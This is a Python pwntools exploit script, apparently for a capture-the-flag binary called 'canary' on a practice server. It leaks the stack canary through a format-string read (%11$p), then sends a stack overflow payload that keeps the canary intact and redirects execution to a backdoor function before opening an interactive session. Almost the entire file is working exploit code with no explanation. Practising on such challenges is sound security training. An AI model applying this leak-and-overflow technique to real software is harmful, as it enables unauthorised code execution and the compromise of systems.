'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "29184" 
filename = "./canary"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)


back_door_addr = 0x0000000000401262
appending_size = 40
appending_str = cyclic(appending_size)

def B():
    gdb.attach(io)
    pause()

def pwn():
    # B()
    # payload = "ffffffff%p|%p|%p|%p|%p|%p|%p|%p|%p"
    payload = b"%11$p"
    io.sendlineafter(b'some gift?\n', payload)
    io.recvuntil(b'There is my gift:\n')
    canary_val = int(io.recvuntil(b'\n', drop=True), 16)
    print('canary: {}'.format(hex(canary_val)))
    payload = appending_str + p64(canary_val) + cyclic(8) + p64(back_door_addr)
    io.sendlineafter(b'your magic\n', payload)


if __name__ == "__main__":
    pwn()
    io.interactive()
